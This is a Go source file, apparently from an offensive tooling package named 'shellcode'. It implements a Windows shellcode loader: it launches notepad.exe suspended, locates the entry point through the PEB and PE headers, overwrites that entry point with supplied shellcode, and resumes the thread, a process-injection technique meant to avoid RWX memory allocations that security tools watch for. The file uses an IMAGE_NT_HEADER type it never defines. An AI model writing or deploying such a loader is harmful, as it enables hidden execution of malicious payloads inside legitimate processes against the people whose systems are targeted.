package shellcode

import (
	"encoding/binary"
	"golang.org/x/sys/windows"
	"unsafe"
)

type IMAGE_DOS_HEADER struct {
	E_lfanew uint32
}

func NoRWX(shellcode []byte) error {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	ntdll := windows.NewLazyDLL("ntdll.dll")

  CreateProcess := kernel32.NewProc("CreateProcessW")
	ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	ResumeThread := kernel32.NewProc("ResumeThread")
	NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")

	var info int32
	var returnLength int32

	var pbi windows.PROCESS_BASIC_INFORMATION
  si:= &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}

  cmd, err := windows.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
  if err != nil {
    return err
  }

  CreateProcess.Call(0, uintptr(unsafe.Pointer(cmd)), 0, 0, 0, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(si)), uintptr(unsafe.Pointer(pi)))

	NtQueryInformationProcess.Call(uintptr(pi.Process), uintptr(info), uintptr(unsafe.Pointer(&pbi)), uintptr(unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{})), uintptr(unsafe.Pointer(&returnLength)))

	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
	var imageBase uintptr = 0

	ReadProcessMemory.Call(uintptr(pi.Process), pebOffset, uintptr(unsafe.Pointer(&imageBase)), 8, 0)

	headersBuffer := make([]byte, 4096)

	ReadProcessMemory.Call(uintptr(pi.Process), uintptr(imageBase), uintptr(unsafe.Pointer(&headersBuffer[0])), 4096, 0)

	var dosHeader IMAGE_DOS_HEADER
	dosHeader.E_lfanew = binary.LittleEndian.Uint32(headersBuffer[60:64])
	ntHeader := (*IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint) + imageBase

	WriteProcessMemory.Call(uintptr(pi.Process), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

	ResumeThread.Call(uintptr(pi.Thread))

  return nil
}
